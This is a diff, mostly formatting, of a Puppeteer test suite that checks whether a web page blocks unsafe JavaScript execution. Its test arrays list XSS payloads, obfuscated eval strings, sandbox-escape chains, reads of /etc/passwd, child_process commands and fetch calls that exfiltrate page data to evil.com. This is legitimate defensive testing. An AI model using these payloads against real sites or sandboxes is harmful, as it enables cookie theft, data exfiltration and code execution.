@@ -6,9 +6,9 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
   let page: Page;
 
   beforeAll(async () => {
-    browser = await puppeteer.launch({ 
+    browser = await puppeteer.launch({
       headless: true,
-      args: ['--disable-features=IsolateOrigins,site-per-process'] // For testing cross-origin scenarios
+      args: ['--disable-features=IsolateOrigins,site-per-process'], // For testing cross-origin scenarios
     });
     page = await browser.newPage();
   });
@@ -30,7 +30,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         'require("child_process").exec("whoami")',
         'process.exit()',
         'import("fs").then(m => m.readFileSync("/etc/passwd"))',
-        
+
         // Obfuscated eval
         'alert\u0028\u0031\u0029',
         'alert\\u0028\\u0031\\u0029',
@@ -38,7 +38,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         'String.fromCharCode(97,108,101,114,116,40,49,41)',
         'atob("YWxlcnQoMSk=")',
         'unescape("%61%6c%65%72%74%28%31%29")',
-        
+
         // Indirect eval
         '(1, eval)("alert(1)")',
         'window.eval("alert(1)")',
@@ -46,19 +46,19 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         'this.eval("alert(1)")',
         'global.eval("alert(1)")',
         'globalThis.eval("alert(1)")',
-        
+
         // eval alternatives
         'Function("alert(1)")()',
         'new Function("alert(1)")()',
         'setTimeout("alert(1)", 0)',
         'setInterval("alert(1)", 1000)',
         'setImmediate("alert(1)")',
-        
+
         // Complex payloads
         'for(let i=0;i<1e6;i++){console.log(i)}',
         'while(true){}',
         'function recurse(){recurse()}recurse()',
-        '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()'
+        '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()',
       ];
 
       for (const code of evalTests) {
@@ -75,7 +75,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         // eval should be restricted or monitored
         if (result.executed) {
           // Check that dangerous operations didn't succeed
-          const alertFired = await new Promise(resolve => {
+          const alertFired = await new Promise((resolve) => {
             page.once('dialog', () => resolve(true));
             setTimeout(() => resolve(false), 100);
           });
@@ -97,30 +97,30 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         ['return window.location.href = "http://evil.com"'],
         ['return document.cookie'],
         ['return fetch("http://evil.com/steal?data=" + document.body.innerHTML)'],
-        
+
         // Multiple arguments
         ['a', 'b', 'return a + b + alert(1)'],
         ['x', 'return eval(x)'],
-        
+
         // Complex bodies
         ['return require("child_process").exec("id")'],
         ['return process.mainModule.require("fs").readFileSync("/etc/passwd")'],
         ['return import("fs").then(m => m.readFileSync("/etc/passwd"))'],
-        
+
         // Async functions
         ['return (async () => { await fetch("http://evil.com"); })()'],
-        
+
         // Generator functions
         ['return (function* () { yield alert(1); })().next()'],
-        
+
         // Arrow functions via parsing
         ['return (() => alert(1))()'],
-        
+
         // With statements
         ['with(document) { write("<script>alert(1)</script>") }'],
-        
+
         // Proxy manipulation
-        ['return new Proxy({}, { get: () => alert(1) })']
+        ['return new Proxy({}, { get: () => alert(1) })'],
       ];
 
       for (const args of functionConstructorTests) {
@@ -137,7 +137,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         // Function constructor should be restricted
         if (result.executed) {
           // Check that dangerous operations didn't succeed
-          const alertFired = await new Promise(resolve => {
+          const alertFired = await new Promise((resolve) => {
             page.once('dialog', () => resolve(true));
             setTimeout(() => resolve(false), 100);
           });
@@ -145,9 +145,10 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
 
           // Verify no data exfiltration
           const requests = await page.evaluate(() => {
-            return performance.getEntriesByType('resource')
-              .map(r => r.name)
-              .filter(url => url.includes('evil.com'));
+            return performance
+              .getEntriesByType('resource')
+              .map((r) => r.name)
+              .filter((url) => url.includes('evil.com'));
           });
           expect(requests.length).toBe(0);
         }
@@ -162,21 +163,25 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         { method: 'setTimeout', code: 'alert(1)', delay: 0 },
         { method: 'setTimeout', code: 'document.cookie="hacked=true"', delay: 0 },
         { method: 'setTimeout', code: 'window.location="http://evil.com"', delay: 0 },
-        
+
         // setInterval with strings
         { method: 'setInterval', code: 'alert(1)', delay: 1000 },
         { method: 'setInterval', code: 'console.log(document.cookie)', delay: 1000 },
-        
+
         // Complex timer code
         { method: 'setTimeout', code: 'fetch("http://evil.com/data").then(r=>r.text())', delay: 0 },
         { method: 'setTimeout', code: 'import("http://evil.com/malware.js")', delay: 0 },
-        
+
         // Nested timers
         { method: 'setTimeout', code: 'setTimeout("alert(1)", 0)', delay: 0 },
-        
+
         // Obfuscated strings
-        { method: 'setTimeout', code: String.fromCharCode(97,108,101,114,116,40,49,41), delay: 0 },
-        { method: 'setTimeout', code: atob('YWxlcnQoMSk='), delay: 0 }
+        {
+          method: 'setTimeout',
+          code: String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41),
+          delay: 0,
+        },
+        { method: 'setTimeout', code: atob('YWxlcnQoMSk='), delay: 0 },
       ];
 
       for (const test of timerStringTests) {
@@ -199,9 +204,9 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         // String execution in timers should be prevented or safe
         if (result.executed) {
           await page.waitForTimeout(100);
-          
+
           // Check no alerts fired
-          const alertFired = await new Promise(resolve => {
+          const alertFired = await new Promise((resolve) => {
             page.once('dialog', () => resolve(true));
             setTimeout(() => resolve(false), 100);
           });
@@ -224,15 +229,15 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
             const div = document.createElement('div');
             div.innerHTML = '<script>alert(1)</script>';
             document.body.appendChild(div);
-            
+
             // Check if script executed
-            return { 
+            return {
               hasScript: div.querySelector('script') !== null,
-              scriptContent: div.querySelector('script')?.textContent
+              scriptContent: div.querySelector('script')?.textContent,
             };
           });
-          
-          const alertFired = await new Promise(resolve => {
+
+          const alertFired = await new Promise((resolve) => {
             page.once('dialog', () => resolve(true));
             setTimeout(() => resolve(false), 100);
           });
@@ -249,9 +254,9 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
               return { executed: false, error: e.message };
             }
           });
-          
+
           if (result.executed) {
-            const alertFired = await new Promise(resolve => {
+            const alertFired = await new Promise((resolve) => {
               page.once('dialog', () => resolve(true));
               setTimeout(() => resolve(false), 100);
             });
@@ -267,8 +272,8 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
             div.insertAdjacentHTML('beforeend', '<script>alert(1)</script>');
             return { injected: true };
           });
-          
-          const alertFired = await new Promise(resolve => {
+
+          const alertFired = await new Promise((resolve) => {
             page.once('dialog', () => resolve(true));
             setTimeout(() => resolve(false), 100);
           });
@@ -283,13 +288,13 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
             div.outerHTML = '<script>alert(1)</script>';
             return { replaced: true };
           });
-          
-          const alertFired = await new Promise(resolve => {
+
+          const alertFired = await new Promise((resolve) => {
             page.once('dialog', () => resolve(true));
             setTimeout(() => resolve(false), 100);
           });
           expect(alertFired).toBe(false);
-        }
+        },
       ];
 
       for (const test of domScriptInjectionTests) {
@@ -307,18 +312,18 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         '//evil.com/backdoor.js',
         'data:text/javascript,alert(1)',
         'javascript:alert(1)',
-        
+
         // Local file access attempts
         'file:///etc/passwd',
         'file://c:/windows/system32/drivers/etc/hosts',
-        
+
         // Relative path traversal
         '../../../secret.js',
         '../../../../etc/passwd',
-        
+
         // Blob URLs
         'blob:http://evil.com/12345',
-        
+
         // Module attempts
         'fs',
         'child_process',
@@ -327,7 +332,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         'crypto',
         'net',
         'http',
-        'https'
+        'https',
       ];
 
       for (const module of dynamicImportTests) {
@@ -342,12 +347,13 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
 
         // Dynamic imports should be restricted
         expect(result.success).toBe(false);
-        
+
         // Verify no external resources were loaded
         const resources = await page.evaluate(() => {
-          return performance.getEntriesByType('resource')
-            .map(r => r.name)
-            .filter(url => url.includes('evil.com'));
+          return performance
+            .getEntriesByType('resource')
+            .map((r) => r.name)
+            .filter((url) => url.includes('evil.com'));
         });
         expect(resources.length).toBe(0);
       }
@@ -362,13 +368,11 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
           const result = await page.evaluate(async () => {
             try {
               // Simple WASM module that could be malicious
-              const wasmCode = new Uint8Array([
-                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00
-              ]);
-              
+              const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
+
               const module = await WebAssembly.compile(wasmCode);
               const instance = await WebAssembly.instantiate(module);
-              
+
               return { compiled: true };
             } catch (e: any) {
               return { compiled: false, error: e.message };
@@ -397,7 +401,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
           if (result.streamed) {
             console.log('WebAssembly streaming is enabled - monitor for abuse');
           }
-        }
+        },
       ];
 
       for (const test of wasmTests) {
@@ -419,17 +423,17 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         { tag: 'audio', attrs: { onerror: 'alert(1)', src: 'x' } },
         { tag: 'details', attrs: { open: true, ontoggle: 'alert(1)' } },
         { tag: 'marquee', attrs: { onstart: 'alert(1)' } },
-        
+
         // JavaScript protocol handlers
         { tag: 'a', attrs: { href: 'javascript:alert(1)' } },
         { tag: 'iframe', attrs: { src: 'javascript:alert(1)' } },
         { tag: 'form', attrs: { action: 'javascript:alert(1)' } },
         { tag: 'object', attrs: { data: 'javascript:alert(1)' } },
         { tag: 'embed', attrs: { src: 'javascript:alert(1)' } },
-        
+
         // Data URL with script
         { tag: 'iframe', attrs: { src: 'data:text/html,<script>alert(1)</script>' } },
-        { tag: 'object', attrs: { data: 'data:text/html,<script>alert(1)</script>' } }
+        { tag: 'object', attrs: { data: 'data:text/html,<script>alert(1)</script>' } },
       ];
 
       for (const test of eventHandlerTests) {
@@ -442,7 +446,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         }, test);
 
         // Check if event handler executed
-        const alertFired = await new Promise(resolve => {
+        const alertFired = await new Promise((resolve) => {
           page.once('dialog', () => resolve(true));
           setTimeout(() => resolve(false), 200);
         });
@@ -452,7 +456,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         // Clean up
         await page.evaluate((tag) => {
           const elements = document.querySelectorAll(tag);
-          elements.forEach(el => el.remove());
+          elements.forEach((el) => el.remove());
         }, test.tag);
       }
     });
@@ -465,24 +469,24 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         'width: expression(alert(1))',
         'height: expression(document.cookie)',
         'background: expression(window.location="http://evil.com")',
-        
+
         // JavaScript URLs in CSS
         'background: url("javascript:alert(1)")',
         'background-image: url("javascript:alert(document.cookie)")',
         'list-style-image: url("javascript:alert(1)")',
         'cursor: url("javascript:alert(1)"), auto',
-        
+
         // CSS imports with JavaScript
         '@import "javascript:alert(1)";',
         '@import url("javascript:alert(1)");',
-        
+
         // Behavior URLs (IE legacy)
         'behavior: url("javascript:alert(1)")',
         'behavior: url(#default#time2)',
-        
+
         // XBL bindings (Firefox legacy)
         '-moz-binding: url("javascript:alert(1)")',
-        'binding: url("javascript:alert(1)")'
+        'binding: url("javascript:alert(1)")',
       ];
 
       for (const cssCode of cssExpressionTests) {
@@ -493,7 +497,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         }, cssCode);
 
         // Check if CSS expression executed
-        const alertFired = await new Promise(resolve => {
+        const alertFired = await new Promise((resolve) => {
           page.once('dialog', () => resolve(true));
           setTimeout(() => resolve(false), 100);
         });
@@ -503,7 +507,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         // Clean up
         await page.evaluate(() => {
           const styles = document.querySelectorAll('style');
-          styles.forEach(s => s.remove());
+          styles.forEach((s) => s.remove());
         });
       }
     });
@@ -518,41 +522,41 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
         '[].constructor.constructor("return process")()',
         '({}).constructor.constructor("return process")()',
         'Error.constructor.constructor("return process")()',
-        
+
         // Global object access
         'Function("return this")()',
         '(function(){return this})()',
         '(()=>this)()',
         'Reflect.get(Function("return this")(), "process")',
-        
+
         // Prototype pollution for escape
         'Object.prototype.toString = function(){ return process }',
         'Array.prototype.join = function(){ return process }',
-        
+
         // Symbol access
         'Object.getOwnPropertySymbols(global)',
         'Reflect.ownKeys(global)',
-        
+
         // Error stack parsing
         'Error().stack',
         'new Error().stack',
-        
+
         // AsyncFunction constructor
         '(async function(){}).constructor("return process")()',
         'Object.getPrototypeOf(async function(){}).constructor("return process")()',
-        
+
         // GeneratorFunction constructor
         '(function*(){}).constructor("return process")()',
-        'Object.getPrototypeOf(function*(){}).constructor("return process")()'
+        'Object.getPrototypeOf(function*(){}).constructor("return process")()',
       ];
 
       for (const escapeCode of sandboxEscapeTests) {
         const result = await page.evaluate((code) => {
           try {
             const result = eval(code);
-            return { 
-              escaped: true, 
-              hasProcess: typeof result === 'object' && 'exit' in result 
+            return {
+              escaped: true,
+              hasProcess: typeof result === 'object' && 'exit' in result,
             };
           } catch (e: any) {
             return { escaped: false, error: e.message };
@@ -566,16 +570,17 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
 
     it('should implement Content Security Policy', async () => {
       const response = await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');
-      
+
       // Check CSP headers
       const headers = response?.headers();
-      const cspHeader = headers?.['content-security-policy'] || headers?.['Content-Security-Policy'];
-      
+      const cspHeader =
+        headers?.['content-security-policy'] || headers?.['Content-Security-Policy'];
+
       if (cspHeader) {
         // Verify unsafe-inline and unsafe-eval are not allowed
         expect(cspHeader).not.toContain("'unsafe-inline'");
         expect(cspHeader).not.toContain("'unsafe-eval'");
-        
+
         // Check for script-src directive
         if (cspHeader.includes('script-src')) {
           expect(cspHeader).toMatch(/script-src\s+[^;]*('self'|'none')/);
@@ -586,7 +591,7 @@ describe('Unsafe JavaScript Execution Security Tests', () => {
 
       // Test CSP enforcement
       const cspViolations: string[] = [];
-      
+
       page.on('console', (msg) => {
         if (msg.type() === 'error' && msg.text().includes('Content Security Policy')) {
           cspViolations.push(msg.text());
